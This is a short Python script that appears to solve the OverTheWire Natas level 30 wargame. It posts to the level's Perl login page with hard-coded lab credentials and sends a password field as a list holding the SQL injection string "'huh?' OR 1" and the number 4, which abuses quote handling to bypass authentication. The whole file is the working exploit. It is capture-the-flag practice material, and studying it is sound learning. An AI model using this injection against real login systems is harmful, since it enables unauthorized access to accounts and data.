import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas30', 'Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

url = "http://natas30.natas.labs.overthewire.org/index.pl"

params={"username": "natas30", "password": ["'huh?' OR 1", 4]}
response = requests.post(url, data=params, auth=auth, verify=False)

print(response.text)